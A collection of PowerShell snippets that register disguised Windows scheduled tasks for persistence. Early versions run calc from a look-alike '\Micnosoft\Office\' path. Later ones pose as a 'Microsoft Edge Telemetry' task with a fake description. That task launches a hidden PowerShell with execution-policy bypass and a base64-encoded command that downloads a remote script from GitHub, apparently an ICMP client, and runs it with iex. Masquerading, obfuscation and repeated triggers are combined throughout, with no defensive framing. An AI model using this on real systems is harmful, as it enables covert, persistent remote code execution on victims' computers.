Register-ScheduledTask 
-TaskName 'Office Feature Updates Helper' 
-TaskPath '\Micnosoft\Office\'  
-Action (New-ScheduledTaskAction -Execute 'powershell' -Argument 'calc') 
-Settings (New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -IdleDuration 00:02:00) 
-Trigger (New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(5).ToString("MM/dd/yyyy hh:mm:ss")) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3))

=======================================================================================

Register-ScheduledTask 
-TaskName 'Office Feature Updates Helper' 
-TaskPath '\Micnosoft\Office\'  
-Action (New-ScheduledTaskAction -Execute 'calc' -Argument '') 
-Settings (New-ScheduledTaskSettingsSet -DisallowHardTerminate -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -IdleDuration 00:02:00) 
-Trigger (New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME)

========================================================================================

if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
}
$ac = New-ScheduledTaskAction -Execute 'powershell' -Argument 'calc'
$st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -IdleDuration 00:02:00 -IdleWaitTimeout 23:00:00
$tr = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
$tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)

$tr.Repetition = $tr2.Repetition

Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr

=========================================================================================

# powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYQAvAG0AYQBzAHQAZQByAC8AYwBvAG0AcABsAGUAdABlAHwAaQBlAHgA

if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
}
$ac = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoLogo -NonInteractive -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA'
$st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
$tr = New-ScheduledTaskTrigger -Daily -At 00:00
$tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)

$tr.Repetition = $tr2.Repetition

Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr

===========================================================================================

# powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYQAvAG0AYQBzAHQAZQByAC8AYwBvAG0AcABsAGUAdABlAHwAaQBlAHgA

if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
}

$ac = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -nol -noni -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA'
# -MultipleInstances Parallel
$st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -RunOnlyIfIdle -IdleDuration 00:01:00 -IdleWaitTimeout 01:00:00
$tr = New-ScheduledTaskTrigger -Daily -At 00:00
$tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)

$tr.Repetition = $tr2.Repetition

Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr